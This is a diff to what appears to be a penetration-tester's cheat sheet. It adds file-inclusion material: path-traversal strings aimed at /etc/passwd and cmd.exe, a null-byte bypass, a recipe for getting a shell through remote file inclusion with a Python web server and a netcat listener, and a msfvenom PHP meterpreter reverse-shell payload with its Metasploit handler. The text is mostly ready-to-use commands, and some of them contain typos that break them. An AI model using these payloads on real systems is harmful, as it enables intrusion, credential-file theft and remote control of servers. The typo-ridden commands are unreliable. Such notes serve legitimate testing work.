@@ -23,6 +23,59 @@ on your attack system "sudo tcpdump -n host [victimIP] and icmp"
 ; nslookup (you need a public facing system to see nslookup)
 {% endhighlight %}
 
+
+> **File Inclusion**
+
+Test Strings:
+{% highlight bash %}
+file%3a%2f%2f%2fetc%2fpasswd
+../../../winnt/system32.cmd.exe+/c+dir (not frequent)
+/ect/passwd
+../../../../../../../../../../../../../../ect/passwd
+{% endhighlight %}
+
+Use ZAP to Fuzz the URL:
+1. Right click on request that looks injectable -> fuzz using
+[JHADDIX_LFI](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/lfi/JHADDIX_LFI.txt)
+
+What to go after:
+* Old IIS: HTTP://vulnsite/scripts/../../../winnt/system32/CMD.exe+/C+dir (may need to encode the slashes)
+* http://vulnsite/index.php?templ=../include/siteconfig.inc (or just templ=red)
+* /global.asax
+* \docume~1\fprefect\mydocu~1
+* \windows\system32\cmd.exe
+* /etc/passwd
+* [Windows pwnwiki](http://pwnwiki.io/#!presence/windows/blind.md)
+* [Linux pwnwiki](http://pwnwiki.io/#!presence/linux/blind.md)
+
+Debian w/ Apache:
+* /var/www/html
+* /home/username/public_html
+
+CGI scripts: 
+* /use/lib/cgi-bin
+
+Auto-Extension Bypass:
+* NULL "%00"
+
+>**Shell from RFI**
+
+1. VI a webshell (https://binaryexile.github.io/6%20-%20Web%20Application/Vulnerabilities/)
+2. python -m SimpleHTTPServer 8080
+3. set up netcat listener (if needed based on webshell)
+3. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)
+
+Meterpreter:
+1) Create Payload: msfvenom LPORT=1234 LHOST=192.168.1.8 -p php/meterpreter_reverse_tcp -f raw > ~/met_rev_tcp_1234.txt
+2) Wrap it: add <?php ?> to the payload
+4)  Set up handler: 
+use exploit/multi/handler
+set payload php/meterpreter_reverse/tcp
+set lhost 192.168.1.8
+set lport 1234
+exploit
+3)  python -m SimpleHTTPServer 8080
+
 > **SQL Injection: Test Strings**
 
 {% highlight bash %}
